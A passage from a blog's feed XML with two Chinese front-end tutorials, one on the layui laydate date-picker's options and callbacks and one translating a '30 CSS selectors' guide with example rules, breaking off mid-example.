      <category>layui</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>layui.laydate时间控件</title>
    <link href="/2019/07/05/layui-laydate%E6%97%B6%E9%97%B4%E6%8E%A7%E4%BB%B6/index/"/>
    <url>/2019/07/05/layui-laydate%E6%97%B6%E9%97%B4%E6%8E%A7%E4%BB%B6/index/</url>
    
    <content type="html"><![CDATA[<p>主要功能：年选择器、年月选择器、日期选择器、时间选择器、日期时间选择器 五种类型的选择方式为基本核心，并且均支持范围选择（即双控件）。 模块加载名称：_laydate_，独立版本：<a href="http://www.layui.com/laydate/">http://www.layui.com/laydate/</a></p><p>一·基础参数选项 通过核心方法：laydate.render(options) 来设置基础参数，也可以通过方法：laydate.set(options) 来设定全局基础参数. elem - 绑定元素是必填项；用于绑定执行日期渲染的元素，值一般为选择器，或DOM对象 laydate.render({ elem: ‘#test’ //或 elem: document.getElementById(‘test’)、elem: lay(‘#test’) 等 });</p><p>二·type - 控件选择类型：用于单独提供不同的选择器类型</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-f8ad6d57d9f3a813.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/701/format/webp"></p><p><img src="//upload-images.jianshu.io/upload_images/10389546-a76d8d7bcdaee8ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/279/format/webp"></p><p>年选择器</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-33244db8403083ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/275/format/webp"></p><p>年月选择器</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-d608e6664b810473.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/280/format/webp"></p><p>时间选择器</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-eaf21cf5411dd9cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/268/format/webp"></p><p>日期时间选择器</p><p>三·range - 开启左右面板范围选择 类型：Boolean/String，默认值：false 如果设置 true，将默认采用 “ - ” 分割。 你也可以直接设置 分割字符。五种选择器类型均支持左右面板的范围选择。</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-a24d4877dee74534.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/653/format/webp"></p><p>image.png</p><p>laydate.render({ elem: ‘#test6’ ,range: true }); 四·format - 自定义格式：类型：String，默认值：yyyy-MM-dd；通过日期时间各自的格式符和长度，来设定一个你所需要的日期格式。layDate 支持的格式如下：</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-c548bedf559306dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/669/format/webp"></p><p>image.png</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-e13f268cbd59762e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/618/format/webp"></p><p>image.png</p><p>//自定义日期格式 laydate.render({ elem: ‘#test’ ,format: ‘yyyy年MM月dd日’ //可任意组合 }); 五·value - 初始值：类型：String，默认值：new Date() //传入符合format格式的字符给初始值 laydate.render({ elem: ‘#test’ ,value: ‘2018-08-18’ //必须遵循format参数设定的格式 });</p><p>//传入Date对象给初始值 laydate.render({ elem: ‘#test’ ,value: new Date(1534766888000) //参数即为：2018-08-20 20:08:08 的时间戳 }); 六·控件初始打开的回调 控件在打开时触发，回调返回一个参数：初始的日期时间对象 laydate.render({ elem: ‘#test’ ,ready: function(date){ console.log(date); //得到初始的日期时间对象：{year: 2017, month: 8, date: 18, hours: 0, minutes: 0, seconds: 0} } }); 七·日期时间被切换后的回调 年月日时间被切换时都会触发。回调返回三个参数，分别代表：生成的值、日期时间对象、结束的日期时间对象 laydate.render({ elem: ‘#test’ ,change: function(value, date, endDate){ console.log(value); //得到日期生成的值，如：2017-08-18 console.log(date); //得到日期时间对象：{year: 2017, month: 8, date: 18, hours: 0, minutes: 0, seconds: 0} console.log(endDate); //得结束的日期时间对象，开启范围选择（range: true）才会返回。对象成员同上。 } }); 八·控件选择完毕后的回调 点击日期、清空、现在、确定均会触发。回调返回三个参数，分别代表：生成的值、日期时间对象、结束的日期时间对象 laydate.render({ elem: ‘#test’ ,done: function(value, date, endDate){ console.log(value); //得到日期生成的值，如：2017-08-18 console.log(date); //得到日期时间对象：{year: 2017, month: 8, date: 18, hours: 0, minutes: 0, seconds: 0} console.log(endDate); //得结束的日期时间对象，开启范围选择（range: true）才会返回。对象成员同上。 } }); 九·弹出控件提示 事实上，执行核心方法 laydate.render(options) 会返回一个当前实例对象。其中包含一些成员属性和方法，比如：hint方法 var ins1 = laydate.render({ elem: ‘#test’ ,change: function(value, date, endDate){ ins1.hint(value); //在控件上弹出value值 } }); 十·其他</p><p><img src="//upload-images.jianshu.io/upload_images/10389546-239e8b1b4a1a2a8e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/906/format/webp"></p>]]></content>
    
    
    <categories>
      
      <category>layui</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>30类css选择器</title>
    <link href="/2019/07/01/30%E7%B1%BBcss%E9%80%89%E6%8B%A9%E5%99%A8/index/"/>
    <url>/2019/07/01/30%E7%B1%BBcss%E9%80%89%E6%8B%A9%E5%99%A8/index/</url>
    
    <content type="html"><![CDATA[<p>这 30 类 CSS 选择器，你必须记在脑袋里！</p><p>大概大家读知道`id`,`class`以及`descendant`选择器，并且整体都在使用它们，那么你正在错误拥有更大级别的灵活性的选择方式。这篇文章里面提到的大部分选择器都是在CSS3标准下的，所以它们只能在相应最新版本的浏览器中才能生效，你完全应该把这些都记在你聪明的脑袋里面。</p><p>1. *</p><p>?</p><p><code>&lt;table&gt;&lt;colgroup&gt;&lt;col&gt;&lt;col&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-cell-id=&quot;4864-1563161659068-cell-0-0&quot;&gt;&lt;div&gt;1&lt;/div&gt;&lt;div&gt;2&lt;/div&gt;&lt;div&gt;3&lt;/div&gt;&lt;div&gt;4&lt;/div&gt;&lt;/td&gt;&lt;td data-cell-id=&quot;4864-1563161659068-cell-0-1&quot;&gt;&lt;div&gt;*&amp;nbsp;&#123;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&amp;nbsp;margin:&amp;nbsp;0;&lt;/div&gt;&lt;div&gt;&amp;nbsp;&amp;nbsp;padding:&amp;nbsp;0;&lt;/div&gt;&lt;div&gt;&#125;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</code></p><p>在我们看比较高级的选择器之前，应该认识下这个众所周知的清空选择器。星号呢会将页面上所有每一个元素都选到。许多开发者都用它来清空`margin`和`padding`。当然你在练习的时候使用这个没问题，但是我不建议在生产环境中使用它。它会给浏览器凭添许多不必要的东西。</p><p>`*`也可以用来选择某元素的所有子元素。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="2579-1563161659068-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="2579-1563161659068-cell-0-1"><div>#container&nbsp;*&nbsp;{</div><div>&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>它会选中`#container`下的所有元素。当然，我还是不建议你去使用它，如果可能的话。</p><p>DEMO</p><p>兼容性</p><ul><li>IE6+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>2. #X</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="2262-1563161659068-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div></td><td data-cell-id="2262-1563161659068-cell-0-1"><div>#container&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;width:&nbsp;960px;</div><div>&nbsp;&nbsp;&nbsp;margin:&nbsp;auto;</div><div>}</div></td></tr></tbody></table><p>在选择器中使用`#`可以用id来定位某个元素。大家通常都会这么使用，然后使用的时候大家还是得相当小心的。</p><p>需要问自己一下：我是不是必须要给这个元素来赋值个id来定位它呢？</p><p>`id`选择器是很严格的并且你没办法去复用它。如果可能的话，首先试试用标签名字，HTML5中的新元素，或者是伪类。</p><p>DEMO</p><p>兼容性</p><ul><li>IE6+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>3. .X</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4835-1563161659068-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="4835-1563161659068-cell-0-1"><div>.error&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>这是个`class`选择器。它跟`id`选择器不同的是，它可以定位多个元素。当你想对多个元素进行样式修饰的时候就可以使用`class`。当你要对某个特定的元素进行修饰那就是用`id`来定位它。</p><p>DEMO</p><p>兼容性</p><ul><li>IE6+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>4. X Y</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3118-1563161659068-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="3118-1563161659068-cell-0-1"><div>li&nbsp;a&nbsp;{</div><div>&nbsp;&nbsp;text-decoration:&nbsp;none;</div><div>}</div></td></tr></tbody></table><p>下一个常用的就是`descendant`选择器。如果你想更加具体的去定位元素，你可以使用它。例如，假如，你不需要定位所有的`a`元素，而只需要定位`li`标签下的`a`标签？这时候你就需要使用`descendant`选择器了。</p><p>专家提示：如果你的选择器像`X Y Z A B.error`这样，那你就错了。时刻都提醒自己，是否真的需要对那么多元素修饰。</p><p>DEMO</p><p>兼容性</p><ul><li>IE6+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>5. X</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3783-1563161659068-cell-0-0"><div>1</div><div>2</div></td><td data-cell-id="3783-1563161659068-cell-0-1"><div>a&nbsp;{&nbsp;color:&nbsp;red;&nbsp;}</div><div>ul&nbsp;{&nbsp;margin-left:&nbsp;0;&nbsp;}</div></td></tr></tbody></table><p>如果你想定位页面上所有的某标签，不是通过`id`或者是&#8217;class&#8217;，这简单，直接使用类型选择器。</p><p>DEMO</p><p>兼容性</p><ul><li>IE6+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>6. X:visited 和 X:link</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4030-1563161659068-cell-0-0"><div>1</div><div>2</div></td><td data-cell-id="4030-1563161659068-cell-0-1"><div>a:link&nbsp;{color:red;}</div><div>a:visited&nbsp;{color:&nbsp;purple;}</div></td></tr></tbody></table><p>我们使用`:link`这个伪类来定位所有还没有被访问过的链接。</p><p>另外，我们也使用`:visited`来定位所有已经被访问过的链接。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>7. X+Y</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3028-1563161659068-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="3028-1563161659068-cell-0-1"><div>ul&nbsp;+&nbsp;p&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>这个叫相邻选择器。它指挥选中指定元素的直接后继元素。上面那个例子就是选中了所有`ul`标签后面的第一段，并将它们的颜色都设置为红色。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>8. X&gt;Y</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="8628-1563161659070-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="8628-1563161659070-cell-0-1"><div>div#container&nbsp;&gt;&nbsp;ul&nbsp;{</div><div>&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>`X Y`和`X &gt; Y`的差别就是后面这个指挥选择它的直接子元素。看下面的例子：</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3022-1563161659070-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div></td><td data-cell-id="3022-1563161659070-cell-0-1"><div>&lt;div&nbsp;id="container"&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;ul&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;Child&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;/ul&gt;</div><div>&lt;/div&gt;</div></td></tr></tbody></table><p>`#container &gt; ul`只会选中`id`为&#8217;container&#8217;的`div`下的所有直接`ul`元素。它不会定位到如第一个`li`下的`ul`元素。</p><p>由于某些原因，使用子节点组合选择器会在性能上有许多的优势。事实上，当在javascript中使用`css`选择器时候是强烈建议这么做的。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>9. X ~ Y</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9967-1563161659070-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="9967-1563161659070-cell-0-1"><div>ul&nbsp;~&nbsp;p&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>兄弟节点组合选择器跟`X+Y`很相似，然后它又不是那么的严格。`ul + p`选择器只会选择紧挨跟着指定元素的那些元素。而这个选择器，会选择跟在目标元素后面的所有匹配的元素。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>10. X[title]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4030-1563161659070-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="4030-1563161659070-cell-0-1"><div>a[title]&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;green;</div><div>}</div></td></tr></tbody></table><p>这个叫属性选择器，上面的这个例子中，只会选择有title属性的元素。那些没有此属性的锚点标签将不会被这个代码修饰。那再想想如果你想更加具体的去筛选？那&#8230;</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>11. X[href=”foo”]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="2389-1563161659070-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="2389-1563161659070-cell-0-1"><div>a[href="http://strongme.cn"]&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;#1f6053;&nbsp;/*&nbsp;nettuts&nbsp;green&nbsp;*/</div><div>}</div></td></tr></tbody></table><p>上面这片代码将会把`href`属性值为`<a href="http://strongme.cn/%60%E7%9A%84%E9%94%9A%E7%82%B9%E6%A0%87%E7%AD%BE%E8%AE%BE%E7%BD%AE%E4%B8%BA%E7%BB%BF%E8%89%B2%EF%BC%8C%E8%80%8C%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E5%88%99%E4%B8%8D%E5%8F%97%E5%BD%B1%E5%93%8D%E3%80%82">http://strongme.cn\`的锚点标签设置为绿色，而其他标签则不受影响。</a></p><p>注意我们将值用双引号括起来了。那么在使用Javascript的时候也要使用双引号括起来。可以的话，尽量使用标准的CSS3选择器。</p><p>这样可以用了，但是还是有点死，如果不是这个链接，而是类似的链接，那么这时就得用正则表达式了。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>12. X[href*=”strongme”]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4123-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="4123-1563161659071-cell-0-1"><div>a[href*="strongme"]&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;#1f6053;</div><div>}</div></td></tr></tbody></table><p>Tada,正是我们需要的，这样，就指定了`strongme`这个值必须出现在锚点标签的`href`属性中，不管是`strongme.cn`还是`strongme.com`还是`<a href="http://www.strongme.cn/%60%E9%83%BD%E5%8F%AF%E4%BB%A5%E8%A2%AB%E9%80%89%E4%B8%AD%E3%80%82">www.strongme.cn\`都可以被选中。</a></p><p>但是记得这是个很宽泛的表达方式。如果锚点标签指向的不是`strongme`相关的站点，如果要更加具体的限制的话，那就使用`^`和`$`，分别表示字符串的开始和结束。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>13. X[href^=”href”]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4785-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div></td><td data-cell-id="4785-1563161659071-cell-0-1"><div>a[href^="http"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;background:&nbsp;url(path/to/external/icon.png)&nbsp;no-repeat;</div><div>&nbsp;&nbsp;&nbsp;padding-left:&nbsp;10px;</div><div>}</div></td></tr></tbody></table><p>大家肯定好奇过，有些站点的锚点标签旁边会有一个外链图标，我也相信大家肯定见过这种情况。这样的设计会很明确的告诉你会跳转到别的网站。</p><p>用克拉符号就可以轻易做到。它通常使用在正则表达式中标识开头。如果我们想定位锚点属性`href`中以`http`开头的标签，那我们就可以用与上面相似的代码。</p><p>注意我们没有搜索http://，那是没必要的，因为它都不包含https://。</p><p>那如果我们想找到所有指向一张图片的锚点标签呢？那我们来使用下`&amp;`字符。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>14. X[href$=”.jpg”]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="2767-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="2767-1563161659071-cell-0-1"><div>a[href$=".jpg"]&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>这次我们又使用了正则表达式`$`，表示字符串的结尾处。这段代码的意思就是去搜索所有的图片链接，或者其它链接是以`.jpg`结尾的。但是记住这种写法是不会对`gifs`和`pngs`起作用的。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>15. X[data-*=”foo”]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="7923-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="7923-1563161659071-cell-0-1"><div>a[data-filetype="image"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>在回到第8条，我们如何把所有的图片类型都选中呢`png`,`jpeg`,&#8217;jpg&#8217;,’gif&#8217;？我们可以使用多选择器。看下面：</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="6454-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></td><td data-cell-id="6454-1563161659071-cell-0-1"><div>a[href$=".jpg"],</div><div>a[href$=".jpeg"],</div><div>a[href$=".png"],</div><div>a[href$=".gif"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>但是这样写着很蛋疼啊，而且效率会很低。另外一个办法就是使用自定义属性。我们可以给每个锚点加个属性`data-filetype`指定这个链接指向的图片类型。</p><p>[html]</p><p>Image Link &lt;/a[/html]</p><p>那有了这个钩子，我们就可以去用标准的办法只去选定文件类型为`image`的锚点了。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4763-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="4763-1563161659071-cell-0-1"><div>a[data-filetype="image"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>16. X[foo~=”bar”]</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4925-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></td><td data-cell-id="4925-1563161659071-cell-0-1"><div>a[data-info~="external"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div><div></div><div>a[data-info~="image"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>这个我想会让你的小伙伴惊呼妙极了。很少有人知道这个技巧。这个`~`符号可以定位那些某属性值是空格分隔多值的标签。</p><p>继续使用第15条那个例子，我们可以设置一个`data-info`属性，它可以用来设置任何我们需要的空格分隔的值。这个例子我们将指示它们为外部连接和图片链接。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9542-1563161659071-cell-0-0"><div>1</div></td><td data-cell-id="9542-1563161659071-cell-0-1"><div>&lt;a&nbsp;href="path/to/image.jpg"&nbsp;data-info="external&nbsp;image"&gt;&nbsp;Click&nbsp;Me,&nbsp;Fool&nbsp;&lt;/a&gt;</div></td></tr></tbody></table><p>给这些元素设置了这个标志之后，我们就可以使用`~`来定位这些标签了。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3567-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div></td><td data-cell-id="3567-1563161659071-cell-0-1"><div>/*&nbsp;Target&nbsp;data-info&nbsp;attr&nbsp;that&nbsp;contains&nbsp;the&nbsp;value&nbsp;"external"&nbsp;*/</div><div>a[data-info~="external"]&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div><div></div><div>/*&nbsp;And&nbsp;which&nbsp;contain&nbsp;the&nbsp;value&nbsp;"image"&nbsp;*/</div><div>a[data-info~="image"]&nbsp;{</div><div>&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>## 17. X:checked</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3150-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="3150-1563161659071-cell-0-1"><div>input[type=radio]:checked&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>上面这个伪类写法可以定位那些被选中的单选框和多选框，就是这么简单。</p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>18. X:after</p><p>`before`和`after`这俩伪类。好像每天大家都能找到使用它们的创造性方法。它们会在被选中的标签周围生成一些内容。</p><p>当使用`.clear-fix`技巧时许多属性都是第一次被使用到里面的。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3930-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div><div>13</div></td><td data-cell-id="3930-1563161659071-cell-0-1"><div>.clearfix:after&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;&nbsp;content:&nbsp;"";</div><div>&nbsp;&nbsp;&nbsp;&nbsp;display:&nbsp;block;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;clear:&nbsp;both;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;visibility:&nbsp;hidden;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;font-size:&nbsp;0;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;height:&nbsp;0;</div><div>&nbsp;&nbsp;}</div><div></div><div>.clearfix&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;*display:&nbsp;inline-block;</div><div>&nbsp;&nbsp;&nbsp;_height:&nbsp;1%;</div><div>}</div></td></tr></tbody></table><p>上面这段代码会在目标标签后面补上一段空白，然后将它清除。这个方法你一定得放你的聚宝盆里面。特别是当`overflow:hidden`方法不顶用的时候，这招就特别管用了。</p><p>还想看其他创造性的使用这个伪类，看[这里](<a href="http://net.tutsplus.com/tutorials/html-css-techniques/quick-tip-getting-clever-with-css3-shadows/)%E3%80%82">http://net.tutsplus.com/tutorials/html-css-techniques/quick-tip-getting-clever-with-css3-shadows/)。</a></p><p>根据CSS3标准规定，可以使用两个冒号`::`。然后为了兼容性，浏览器也会接受一个双引号的写法。其实在这个情况下，用一个冒号还是比较明智的。</p><p>兼容性</p><ul><li>IE8+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>19. X::hover</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="1719-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="1719-1563161659071-cell-0-1"><div>div:hover&nbsp;{</div><div>&nbsp;&nbsp;background:&nbsp;#e3e3e3;</div><div>}</div></td></tr></tbody></table><p>不用说，大家肯定知道它。官方的说法是`user action pseudo class`.听起来有点儿迷糊，其实还好。如果想在用户鼠标飘过的地方涂点儿彩，那这个伪类写法可以办到。</p><p>注意旧版本的IE只会对加在锚点`a`标签上的`:hover`伪类起作用。</p><p>通常大家在鼠标飘过锚点链接时候加下边框的时候用到它。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9130-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="9130-1563161659071-cell-0-1"><div>a:hover&nbsp;{</div><div>&nbsp;border-bottom:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>专家提示：border-bottom:1px solid black;比text-decoration:underline;要好看很多。</p><p>兼容性</p><ul><li>IE6+(IE6只能在锚点标签上起作用)</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>20. X:not(selector)</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="7152-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="7152-1563161659071-cell-0-1"><div>div:not(#container)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;blue;</div><div>}</div></td></tr></tbody></table><p>`取反`伪类是相当有用的，假设我们要把除`id`为`container`之外的所有`div`标签都选中。那上面那么代码就可以做到。</p><p>或者说我想选中所有出段落标签之外的所有标签。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="1640-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="1640-1563161659071-cell-0-1"><div>*:not(p)&nbsp;{</div><div>&nbsp;&nbsp;color:&nbsp;green;</div><div>}</div></td></tr></tbody></table><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>21. X::pseudoElement</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4021-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div></td><td data-cell-id="4021-1563161659071-cell-0-1"><div>p::first-line&nbsp;{</div><div>&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>&nbsp;&nbsp;font-size:1.2em;</div><div>}</div></td></tr></tbody></table><p>我们可以使用`::`来选中某标签的部分内容，如地一段，或者是第一个字没有。但是记得必须使用在块式标签上才起作用。</p><p>伪标签是由两个冒号 :: 组成的。</p><p>定位第一个字</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9287-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></td><td 